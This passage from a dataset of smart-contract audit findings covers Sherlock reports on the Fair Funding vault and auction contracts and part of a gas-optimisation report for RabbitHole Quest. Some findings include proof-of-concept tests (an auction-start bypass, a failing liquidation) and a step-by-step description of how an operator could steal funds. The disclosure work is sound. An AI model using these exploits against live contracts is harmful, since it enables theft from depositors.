denominator in lines 143 and 144 from `1e18` to `1e9` to use the required `18` decimals for the `ICHI` v2 token. The bug was found by berndartmueller, 0x52 and was reviewed manually.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-blueberry-judging/issues/319",
      "tags": [
        "Deposit/Reward tokens",
        "Decimals",
        "Configuration"
      ],
      "finders": [
        "berndartmueller",
        "0x52"
      ]
    },
    {
      "id": "6537",
      "title": "M-3: Starting timestamp can be bypassed by calling `settle`",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/39 \n\n## Found by \nck, Bahurum, carrot, 0xhacksmithh, 0xlmanini, HonorLt, 7siech, ABA, rvierdiiev, XKET, seyni\n\n## Summary\nThe starting timestamp set or still unset by the owner through the `start_auction` function can be bypassed by calling `settle`, which sends the first token to the fallback and then starts the auction for subsequent tokenIds.\n## Vulnerability Detail\nThe function `start_auction` is meant to be used to start the auction process, after which the bids start getting accepted. However, this entire system can be bypassed by calling the `settle` function. This leads to the first tokenId being minted to the fallback address, and the next tokenId auction being started immediately.\n\nThis can be exploited in two scenarios,\n1. The function `start_auction` hasn't been called yet\n2. The function `start_auction` has been called, and the timestamp passed is a timestamp in the future\n\nIn both these cases, the auctions can be made to start immediately. Thus the two issues are clubbed together.\n\nThe function `settle` only checks for the timestamp using the statement\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/AuctionHouse.vy#L185\nwhich is defined as\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/AuctionHouse.vy#L247-L252\nThis check passes if the current timestamp is after the end of the epoch, but also if the current timestamp is before the start of the auction, which is the main issue here.\n\nInside the `settle` function, it sets the start and end timestamps properly, which allows bids to be made for subsequent tokenIds.\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/AuctionHouse.vy#L200-L206\n\nSo even if the starting timestamp is unset or set in the future, the checks in `settle` pass, and the function then proceeds to write the start and end timestamps to process bids correctly. \n## Impact\nBids can be started immediately. This goes against the design of the protocol.\n## Code Snippet\nThe issue can be recreated with the following POC\n```python\ndef test_ATTACK_settle_before_start(owner, house, nft):\n    token_id = house.current_epoch_token_id()\n    assert house.highest_bidder() == pytest.ZERO_ADDRESS\n    house.settle()\n    house.bid(house.current_epoch_token_id(), house.RESERVE_PRICE())\n    assert house.current_epoch_token_id() == token_id + 1\n    assert nft.ownerOf(token_id) == owner\n```\nThis shows a case where `start_action` is never called, yet the bids start. The same can be done if `start_auction` is called with a timestamp in the future\n## Tool used\nBoa\nManual Review\n\n## Recommendation\nChange the check in `settle` to check for the end timestamp ONLY\n```vyper\nassert block.timestamp > self.epoch_end\n```\n\n## Discussion\n\n**hrishibhat**\n\nWhile the issue is valid, there are no funds at risk with starting the auction early. \nConsidering this issue a valid medium. \n\n**Unstoppable-DeFi**\n\nhttps://github.com/Unstoppable-DeFi/fair-funding/pull/7",
      "summary": "\nA bug has been identified in the code of the \"2023-02-fair-funding-judging\" project on GitHub. This bug allows the starting timestamp set or still unset by the owner through the `start_auction` function to be bypassed by calling `settle`. This results in the first token being minted to the fallback address, and the next tokenId auction being started immediately. This bug can be exploited in two scenarios: 1) the `start_auction` function hasn't been called yet, or 2) the `start_auction` function has been called with a timestamp in the future. The bug is caused by the `settle` function only checking for the timestamp using a statement that passes if the current timestamp is after the end of the epoch, but also if the current timestamp is before the start of the auction. The impact of this bug is that bids can be started immediately, which goes against the design of the protocol. A proof of concept code snippet has been provided to recreate the issue. The recommended solution is to change the check in `settle` to check for the end timestamp only. The bug has been identified as a valid medium, as there are no funds at risk with starting the auction early. A pull request has been made to address the issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Fair Funding by Alchemix & Unstoppable",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/39",
      "tags": [],
      "finders": [
        "0xhacksmithh",
        "Bahurum",
        "XKET",
        "ABA",
        "7siech",
        "0xlmanini",
        "ck",
        "HonorLt",
        "rvierdiiev",
        "seyni",
        "carrot"
      ]
    },
    {
      "id": "6536",
      "title": "M-2: Broken Operator Mechanism: Just 1 malicious / compromised operator can permanently break functionality",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/46 \n\n## Found by \nweeeh\\_, hickuphh3, ABA, 0xSmartContract, rvierdiiev, csanuragjain\n\n## Summary\nOperator access control isn't sufficiently resilient against a malicious or compromised actor.\n\n## Vulnerability Detail\nI understand that we can assume all privileged roles to be trusted, but this is about the access control structure for the vault operators. The key thing here is that you can have multiple operators who can add or remove each other. As the saying goes, _\"you are as strong as your weakest link\"_, so all it required is for 1 malicious or compromised operator to permanently break protocol functionality, with no possible remediation as he's able to kick out all other honest operators, _including himself_\n\nThe vault operator can do the following:\n1) Set the `alchemist` contract to any address (except null) of his choosing. He can therefore permanently brick the claiming and liquidation process, resulting in the permanent locking of token holders' funds in Alchemix.\n2) Steal last auction funds. WETH approval is given to the `alchemist` contract every time `register_deposit` is called, and with the fact that anyone can settle the contract, the malicious operator is able to do the following atomically:\n    - set the alchemist contract to a malicious implementation\n       - contract returns a no-op + arbitrary `shares_issued` value when the `depositUnderlying()` function is called\n    - settle the last auction (assuming it hasn't been)\n    - pull auction funds from approval given\n3) Do (1) and remove himself as an operator (ie. there are no longer any operators), permanently preventing any possible remediation.\n\n## Impact\nDoS / holding the users' funds hostage.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L292-L300\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L589-L614\n\n## Tool used\nManual Review\n\n## Recommendation\nAdd an additional access control layer on top of operators: an `owner` that will be held by a multisig / DAO that's able to add / remove operators. \n\n## Discussion\n\n**Unstoppable-DeFi**\n\nhttps://github.com/Unstoppable-DeFi/fair-funding/pull/10",
      "summary": "\nThis bug report is about the vulnerability of the access control structure for vault operators in the Fair Funding protocol. It is possible for one malicious or compromised operator to permanently break the protocol functionality, with no possible remediation. This can be done by setting the `alchemist` contract to any address, stealing last auction funds, and removing himself as an operator. The impact of this vulnerability is DoS (Denial of Service) and holding users' funds hostage. The code snippet mentioned in the report can be found in the Github repository. The recommended solution is to add an additional access control layer on top of operators, such as an `owner` that will be held by a multisig or DAO that is able to add and remove operators. This bug report was found by weeeh\\_, hickuphh3, ABA, 0xSmartContract, rvierdiiev, and csanuragjain, and was discussed in the Unstoppable-DeFi Github repository.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Fair Funding by Alchemix & Unstoppable",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/46",
      "tags": [],
      "finders": [
        "csanuragjain",
        "ABA",
        "hickuphh3",
        "0xSmartContract",
        "rvierdiiev",
        "weeeh\\_"
      ]
    },
    {
      "id": "6535",
      "title": "M-1: Migrator contract lacks sufficient permissions over vault positions",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/91 \n\n## Found by \n0x52, hickuphh3, Ruhum, minhtrng, jkoppel, ABA\n\n## Summary\nThe migrator contract lacks sufficient permissions over vault shares to successfully perform migration.\n\n## Vulnerability Detail\n> Since vault potentially holds an Alchemix position over a long time during which changes at Alchemix could happen, the `migration_admin` has complete control over the vault and its position after giving depositors a 30 day window to liquidate (or transfer with a flashloan) their position if they're not comfortable with the migration.\n\nWe see that all that `migrate()` does is to trigger the `migrate()` function on the migration contract. However, no permissions over the vault's shares were given to the migration contract to enable it to say, liquidate to underlying or yield tokens. It also goes against what was intended, that is, _\"complete control over the vault and its position\"_.\n\n```vyper\n@external\ndef migrate():\n    \"\"\"\n    @notice\n        Calls migrate function on the set migrator contract.\n        This is just in case there are severe changes in Alchemix that\n        require a full migration of the existing position.\n    \"\"\"\n    assert self.migration_active <= block.timestamp, \"migration not active\"\n    assert self.migration_executed == False, \"migration already executed\"\n    self.migration_executed = True\n    Migrator(self.migrator).migrate()\n```\n\n## Impact\nFunds / positions cannot be successfully migrated due to lacking permissions.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L545-L556\n\n## Tool used\nManual Review\n\n## Recommendation\nIn addition to invoking the `migrate()` function, consider calling `approveWithdraw()` on the migrator contract for all of the vault's shares.\nhttps://alchemix-finance.gitbook.io/v2/docs/alchemistv2#approvewithdraw\n\nAlso consider using `raw_call()` for this function call because the current `alchemist` possibly reverts, bricking the migration process entirely.\n\n## Discussion\n\n**Unstoppable-DeFi**\n\nThis is correct, a `delegateCall` should have been used.\n\nWill fix.\n\n**Unstoppable-DeFi**\n\nhttps://github.com/Unstoppable-DeFi/fair-funding/pull/6",
      "summary": "\nThe issue M-1 reports that the migrator contract lacks sufficient permissions over vault positions and was found by 0x52, hickuphh3, Ruhum, minhtrng, jkoppel, and ABA. This vulnerability is due to the fact that the `migrate()` function on the migration contract does not have permissions over the vault's shares to liquidate to underlying or yield tokens. This means that funds and positions cannot be successfully migrated. The recommendation to fix this issue is to call `approveWithdraw()` on the migrator contract for all of the vault's shares and consider using `raw_call()` for this function call. Unstoppable-DeFi has confirmed that this is correct and a `delegateCall` should have been used. They have created a pull request to fix this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Fair Funding by Alchemix & Unstoppable",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/91",
      "tags": [],
      "finders": [
        "0x52",
        "ABA",
        "jkoppel",
        "hickuphh3",
        "Ruhum",
        "minhtrng"
      ]
    },
    {
      "id": "6534",
      "title": "H-2: Incorrect shares accounting cause liquidations to fail in some cases",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/38 \n\n## Found by \n0x52, Bauer, hickuphh3, jkoppel\n\n## Summary\nAccounting mismatch when marking claimable yield against the vault's shares may cause failing liquidations.\n\n## Vulnerability Detail\n`withdraw_underlying_to_claim()` distributes `_amount_shares` worth of underlying tokens (WETH) to token holders. Note that this burns the shares held by the vault, but for accounting purposes, the `total_shares` variable isn't updated.\n\nHowever, if a token holder chooses to liquidate his shares, his `shares_owned` are used entirely in both `alchemist.liquidate()` and `withdrawUnderlying()`. Because the contract no longer has fewer shares as a result of the yield distribution, the liquidation will fail.\n\n## POC\nRefer to the `testVaultLiquidationAfterRepayment()` test case below. Note that this requires a fix to be applied for #2 first.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"../../lib/utils/VyperDeployer.sol\";\n\nimport \"../IVault.sol\";\nimport \"../IAlchemistV2.sol\";\nimport \"../MintableERC721.sol\";\nimport \"openzeppelin/token/ERC20/IERC20.sol\";\n\ncontract VaultTest is Test {\n    ///@notice create a new instance of VyperDeployer\n    VyperDeployer vyperDeployer = new VyperDeployer();\n\n    FairFundingToken nft;\n    IVault vault;\n    address vaultAdd;\n    IAlchemistV2 alchemist = IAlchemistV2(0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c);\n    IWhitelist whitelist = IWhitelist(0xA3dfCcbad1333DC69997Da28C961FF8B2879e653);\n    address yieldToken = 0xa258C4606Ca8206D8aA700cE2143D7db854D168c;\n    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    // pranking from big WETH holder\n    address admin = 0x2fEb1512183545f48f6b9C5b4EbfCaF49CfCa6F3;\n    address user1 = address(0x123);\n    address user2 = address(0x456);\n    \n    function setUp() public {\n        vm.startPrank(admin);\n        nft = new FairFundingToken();\n        /// @notice: I modified vault to take in admin as a parameter\n        /// because of pranking issues => setting permissions\n        vault = IVault(\n            vyperDeployer.deployContract(\"Vault\", abi.encode(address(nft), admin))\n        );\n        // to avoid having to repeatedly cast to address\n        vaultAdd = address(vault);\n        vault.set_alchemist(address(alchemist));\n\n        // whitelist vault and users in Alchemist system, otherwise will run into permission issues\n        vm.stopPrank();\n        vm.startPrank(0x9e2b6378ee8ad2A4A95Fe481d63CAba8FB0EBBF9);\n        whitelist.add(vaultAdd);\n        whitelist.add(admin);\n        whitelist.add(user1);\n        whitelist.add(user2);\n        vm.stopPrank();\n\n        vm.startPrank(admin);\n\n        // add depositors\n        vault.add_depositor(admin);\n        vault.add_depositor(user1);\n        vault.add_depositor(user2);\n\n        // check yield token is whitelisted\n        assert(alchemist.isSupportedYieldToken(yieldToken));\n\n        // mint NFTs to various parties\n        nft.mint(admin, 1);\n        nft.mint(user1, 2);\n        nft.mint(user2, 3);\n        \n\n        // give max WETH approval to vault & alchemist\n        weth.approve(vaultAdd, type(uint256).max);\n        weth.approve(address(alchemist), type(uint256).max);\n\n        // send some WETH to user1 & user2\n        weth.transfer(user1, 10e18);\n        weth.transfer(user2, 10e18);\n\n        // users give WETH approval to vault and alchemist\n        vm.stopPrank();\n        vm.startPrank(user1);\n        weth.approve(vaultAdd, type(uint256).max);\n        weth.approve(address(alchemist), type(uint256).max);\n        vm.stopPrank();\n        vm.startPrank(user2);\n        weth.approve(vaultAdd, type(uint256).max);\n        weth.approve(address(alchemist), type(uint256).max);\n        vm.stopPrank();\n\n        // by default, msg.sender will be admin\n        vm.startPrank(admin);\n    }\n\n    function testVaultLiquidationAfterRepayment() public {\n        uint256 depositAmt = 1e18;\n        // admin does a deposit\n        vault.register_deposit(1, depositAmt);\n        vm.stopPrank();\n\n        // user1 does a deposit too\n        vm.prank(user1);\n        vault.register_deposit(2, depositAmt);\n\n        // simulate yield: someone does partial manual repayment\n        vm.prank(user2);\n        alchemist.repay(address(weth), 0.1e18, vaultAdd);\n\n        // mark it as claimable (burn a little bit more shares because of rounding)\n        vault.withdraw_underlying_to_claim(\n            alchemist.convertUnderlyingTokensToShares(yieldToken, 0.01e18) + 100,\n            0.01e18\n        );\n\n        vm.stopPrank();\n\n        // user1 performs liquidation, it's fine\n        vm.prank(user1);\n        vault.liquidate(2, 0);\n\n        // assert that admin has more shares than what the vault holds\n        (uint256 shares, ) = alchemist.positions(vaultAdd, yieldToken);\n        IVault.Position memory adminPosition = vault.positions(1);\n        assertGt(adminPosition.sharesOwned, shares);\n\n        vm.prank(admin);\n        // now admin is unable to liquidate because of contract doesn't hold sufficient shares\n        // expect Arithmetic over/underflow error\n        vm.expectRevert(stdError.arithmeticError);\n        vault.liquidate(1, 0);\n    }\n}\n```\n\n## Impact\nFailing liquidations as the contract attempts to burn more shares than it holds.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L341-L349\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L393-L404\n\n## Tool used\nFoundry, Mainnet Forking, Manual Review\n\n## Recommendation\nFor the `shares_to_liquidate` and `amount_to_withdraw` variables, check against the vault's current shares and take the minimum of the 2.\n\nThe better fix would be to switch from marking yield claims with withdrawing WETH collateral to minting debt (alETH) tokens.\n\n## Discussion\n\n**Unstoppable-DeFi**\n\nThis is correct.\n\nWe need to use `total_shares` and `position.shares_owned` to calculate the percentage of a positions contributions and then multiply it with the `remaining_shares` to receive the correct amount of shares during liquidation.\n\n**Unstoppable-DeFi**\n\nhttps://github.com/Unstoppable-DeFi/fair-funding/pull/9",
      "summary": "\nThis bug report is about an issue with incorrect shares accounting that can cause liquidations to fail in some cases. It was found by 0x52, Bauer, hickuphh3, and jkoppel. The bug occurs when the `withdraw_underlying_to_claim()` function distributes `_amount_shares` worth of underlying tokens (WETH) to token holders, but the `total_shares` variable isn't updated. This can cause the liquidation to fail when a token holder tries to liquidate their shares because the contract no longer has fewer shares as a result of the yield distribution. The bug can be seen in the `testVaultLiquidationAfterRepayment()` test case.\n\nThe impact of this bug is failing liquidations as the contract attempts to burn more shares than it holds. The code snippets for this bug can be found at https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L341-L349 and https://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L393-L404. The tools used to find this bug include Foundry, Mainnet Forking, and Manual Review.\n\nThe recommendation to fix this bug is to check the `shares_to_liquidate` and `amount_to_withdraw` variables against the vault's current shares and take the minimum of the two. The better fix would be to switch from marking yield claims with withdrawing WETH collateral to minting debt (alETH) tokens. This can be seen in the pull request at https://github.com/Unstoppable-DeFi/fair-funding/pull/9.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Fair Funding by Alchemix & Unstoppable",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/38",
      "tags": [],
      "finders": [
        "jkoppel",
        "hickuphh3",
        "0x52",
        "Bauer"
      ]
    },
    {
      "id": "6533",
      "title": "H-1: amount_claimable_per_share accounting is broken and will result in vault insolvency",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/44 \n\n## Found by \n0x52, jkoppel, oxcm\n\n## Summary\n\nClaim accounting is incorrect if there is a deposit when amount_claimable_per_share !=0, because position.amount_claimed isn't initialized when the deposit is created.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L430-L440\n\nWhen calculating the amount of WETH to claim for a user, the contract simply multiplies the share count by the current amount_claimable_per_share and then subtracts the amount that has already been paid out to that token holder. This is problematic for deposits that happen when amount_claimable_per_share != 0 because they will be eligible to claim WETH immediately as if they had been part of the vault since amount_claimable_per_share != 0.\n\nExample;\nUser A deposits 1 ETH and receives 1 share. Over time the loan pays itself back and claim is able to withdraw 0.1 WETH. This causes amount_claimable_per_share = 0.1. Now User B deposits 1 ETH and receives 1 share. They can immediately call claim which yields them 0.1 WETH (1 * 0.1 - 0). This causes the contract to over-commit the amount of WETH to payout since it now owes a total of 0.2 WETH (0.1 ETH to each depositor) but only has 0.1 WETH.\n\n## Impact\n\nContract will become insolvent\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-fair-funding/blob/main/fair-funding/contracts/Vault.vy#L200-L232\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nposition.amountClaimed needs to be initialized when a deposit is made:\n      \n        # deposit WETH to Alchemix\n        shares_issued: uint256 = self._deposit_to_alchemist(_amount)\n        position.shares_owned += shares_issued\n    +   position.amount_claimed += shares_issued * amount_claimable_per_share\n        self.total_shares += shares_issued\n        \n        self.positions[_token_id] = position\n        \n\n## Discussion\n\n**HickupHH3**\n\nDup of #114\n\n**0x00052**\n\nEscalate for 1 USDC\n\nNot a dupe of #114. That focuses on depositing twice to the same token (which can't happen outside of admin abuse). The issue is that it generally applies to all deposits. Please re-read my example as to why this is an issue and how it leads to gross over-commitment of rewards.\n\nTwo reasons I disagree with this being low:\n1) The argument that this will only be used for a short period and so \"it doesn't have much impact\" is a poor argument. This is meant as a general utility that anyone can use and they should be able to make a funding period as long as they want\n2) This is a serious issue that will lead to rewards being over-committed and the vault WILL go insolvent as a result. The extra fees being paid will be taken from other users and will GUARANTEED cause loss of funds to other users.\n\nWould like to add that this and #113 are the same issue and escalations should be resolved together.\n\n**sherlock-admin**\n\n > Escalate for 1 USDC\n> \n> Not a dupe of #114. That focuses on depositing twice to the same token (which can't happen outside of admin abuse). The issue is that it generally applies to all deposits. Please re-read my example as to why this is an issue and how it leads to gross over-commitment of rewards.\n> \n> Two reasons I disagree with this being low:\n> 1) The argument that this will only be used for a short period and so \"it doesn't have much impact\" is a poor argument. This is meant as a general utility that anyone can use and they should be able to make a funding period as long as they want\n> 2) This is a serious issue that will lead to rewards being over-committed and the vault WILL go insolvent as a result. The extra fees being paid will be taken from other users and will GUARANTEED cause loss of funds to other users.\n> \n> Would like to add that this and #113 are the same issue and escalations should be resolved together.\n\nYou've created a valid escalation for 1 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Unstoppable-DeFi**\n\nAgree, duplicate of #113 and will fix.\n\n**hrishibhat**\n\nEscalation accepted\n\nConsidering this & its duplicate #113  as valid issues\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Considering this & its duplicate #113  as valid issues\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**Unstoppable-DeFi**\n\nhttps://github.com/Unstoppable-DeFi/fair-funding/pull/8",
      "summary": "\nThis bug report is about an issue in the Vault contract of the Fair Funding project. The issue is that the contract's amount_claimable_per_share accounting is broken and will result in vault insolvency. It was found by 0x52, jkoppel, and oxcm. \n\nThe issue is that when calculating the amount of WETH to claim for a user, the contract simply multiplies the share count by the current amount_claimable_per_share and then subtracts the amount that has already been paid out to that token holder. This is problematic for deposits that happen when amount_claimable_per_share != 0 because they will be eligible to claim WETH immediately as if they had been part of the vault since amount_claimable_per_share != 0. This causes the contract to over-commit the amount of WETH to payout since it now owes a total of 0.2 WETH (0.1 ETH to each depositor) but only has 0.1 WETH. \n\nThe impact of this is that the contract will become insolvent. The recommendation is to initialize position.amountClaimed when a deposit is made. The tool used to find this bug was manual review. \n\nHickupHH3 suggested that this was a duplicate of #114, but 0x00052 disagreed, stating that this applies to all deposits and that it is a serious issue that will lead to rewards being over-committed and the vault going insolvent as a result. Sherlock-admin accepted the escalation and Unstoppable-DeFi created a pull request for the fix. Hrishibhat accepted the escalation and considered this and its duplicate #113 as valid issues. Sherlock-admin then updated the contestants' payouts and scores according to the changes made on this issue.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Fair Funding by Alchemix & Unstoppable",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-02-fair-funding-judging/issues/44",
      "tags": [],
      "finders": [
        "jkoppel",
        "oxcm",
        "0x52"
      ]
    },
    {
      "id": "43380",
      "title": "[G-14] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are \n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n61        function createQuest(\n62            address rewardTokenAddress_,\n63            uint256 endTime_,\n64            uint256 startTime_,\n65            uint256 totalParticipants_,\n66            uint256 rewardAmountOrTokenId_,\n67            string memory contractType_,\n68            string memory questId_\n69:       ) public onlyRole(CREATE_QUEST_ROLE) returns (address) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L61-L69\n\n```solidity\nFile: contracts/RabbitHoleTickets.sol\n\n92        function mintBatch(\n93            address to_,\n94            uint256[] memory ids_,\n95            uint256[] memory amounts_,\n96            bytes memory data_\n97:       ) public onlyMinter {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleTickets.sol#L92-L97\n\n## Excluded findings\nThese findings are excluded from awards calculations because there are publicly-available automated tools that find them. The valid ones appear here for completeness.\n\n### Summary\n\n| |Issue|Instances|Total Gas Saved|\n|-|:-|:-:|:-:|\n| [G&#x2011;15] | `<array>.length` should not be looked up in every loop of a `for`-loop | 2 |  6 |\n| [G&#x2011;16] | `require()`/`revert()` strings longer than 32 bytes cost extra gas | 1 |  - |\n| [G&#x2011;17] | Using `bool`s for storage incurs overhead | 4 |  68400 |\n| [G&#x2011;18] | `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too) | 8 |  40 |\n| [G&#x2011;19] | Using `private` rather than `public` for constants, saves gas | 1 |  - |\n| [G&#x2011;20] | Functions guaranteed to revert when called by normal users can be marked `payable` | 25 |  525 |\n\nTotal: 41 instances over 6 issues with **68971 gas** saved\n\nGas totals use lower bounds of ranges and count two iterations of each `for`-loop. All values above are runtime, not deployment, values; deployment values are listed in the individual issue descriptions.\n\n### [G&#x2011;15] `<array>.length` should not be looked up in every loop of a `for`-loop\nThe overheads outlined below are _PER LOOP_, excluding the first loop\n* storage arrays incur a Gwarmaccess (**100 gas**)\n* memory arrays use `MLOAD` (**3 gas**)\n* calldata arrays use `CALLDATALOAD` (**3 gas**)\n\nCaching the length changes each of these to a `DUP<N>` (**3 gas**), and gets rid of the extra `DUP<N>` needed to store the stack offset\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: contracts/Quest.sol\n\n/// @audit (valid but excluded finding)\n70:           for (uint i = 0; i < tokenIds_.length; i++) {\n\n/// @audit (valid but excluded finding)\n104:          for (uint i = 0; i < tokens.length; i++) {\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L70\n\n### [G&#x2011;16] `require()`/`revert()` strings longer than 32 bytes cost extra gas\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n/// @audit (valid but excluded finding)\n161:          require(_exists(tokenId_), 'ERC721URIStorage: URI query for nonexistent token');\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L161\n\n### [G&#x2011;17] Using `bool`s for storage incurs overhead\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\n\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit (valid but excluded finding)\n30:       mapping(address => bool) public rewardAllowlist;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L30\n\n```solidity\nFile: contracts/Quest.sol\n\n/// @audit (valid but excluded finding)\n19:       bool public hasStarted;\n\n/// @audit (valid but excluded finding)\n20:       bool public isPaused;\n\n/// @audit (valid but excluded finding)\n24:       mapping(uint256 => bool) private claimedList;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L19\n\n### [G&#x2011;18] `++i` costs less gas than `i++`, especially when it's used in `for`-loops (`--i`/`i--` too)\nSaves **5 gas per loop**\n\n*There are 8 instances of this issue:*\n\n```solidity\nFile: contracts/QuestFactory.sol\n\n/// @audit (valid but excluded finding)\n226:          quests[questId_].numberMinted++;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/QuestFactory.sol#L226\n\n```solidity\nFile: contracts/Quest.sol\n\n/// @audit (valid but excluded finding)\n70:           for (uint i = 0; i < tokenIds_.length; i++) {\n\n/// @audit (valid but excluded finding)\n104:          for (uint i = 0; i < tokens.length; i++) {\n\n/// @audit (valid but excluded finding)\n106:                  redeemableTokenCount++;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/Quest.sol#L70\n\n```solidity\nFile: contracts/RabbitHoleReceipt.sol\n\n/// @audit (valid but excluded finding)\n117:          for (uint i = 0; i < msgSenderBalance; i++) {\n\n/// @audit (valid but excluded finding)\n121:                  foundTokens++;\n\n/// @audit (valid but excluded finding)\n128:          for (uint i = 0; i < msgSenderBalance; i++) {\n\n/// @audit (valid but excluded finding)\n131:                  filterTokensIndexTracker++;\n\n```\nhttps://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L117\n\n### [G&#x2011;19] Using `private` rather than `public` for constants, saves gas\nIf needed, the values can be read from the verified contract source code, or if there are multiple values there can be a single getter function that [returns a tuple](https://github.com/code-423n4/2022-08-frax/blob/90f55a9ce4e25bceed3a74290b854341d8de6afa/src/contracts/FraxlendPair.sol#L156-L178) of the values of all currently-public constants. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table.\n\n*There is 1 instance of this 